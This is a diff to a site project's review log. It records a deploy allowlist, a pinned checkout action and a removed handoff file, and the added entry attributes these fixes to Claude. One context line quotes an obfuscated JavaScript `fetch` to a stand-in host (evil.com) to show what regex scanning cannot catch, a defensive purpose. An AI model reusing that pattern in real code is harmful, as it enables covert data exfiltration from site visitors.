@@ -153,3 +153,11 @@ Success
 - Runtime dynamic string concatenation in JavaScript (e.g. `const u = "https" + ":" + "/" + "/evil.com"; fetch(u);`) cannot be statically detected by regex grep; however, runtime browser exfiltration is blocked by the Content Security Policy meta tag (`default-src 'self'`).
 - UNAVAILABLE — not verified on a real domain (GitHub Pages) directly.
 
+
+## Claude final review — fix B1 applied by Claude (owner request, 2026-10-01)
+- `pages.yml` now stages an **allowlist** (`index.html`, `404.html`, `styles.css`, `robots.txt`, `sitemap.xml`, `CNAME`,
+  `privacy-policy.html` and `consents.html` when present, and `assets/` minus `og.html`). It fails if `_site` contains any
+  `.md` file, a `spec_and_plans`/`docs` path or a dotfile. Simulated locally: the clean tree stages exactly 9 files, and
+  adding `assets/notes.md` makes the step exit 1.
+- `actions/checkout` is re-pinned to `3d3c42e5aac5ba805825da76410c181273ba90b1` (v7.0.1).
+- The stray `docs/handoff.md` is removed.
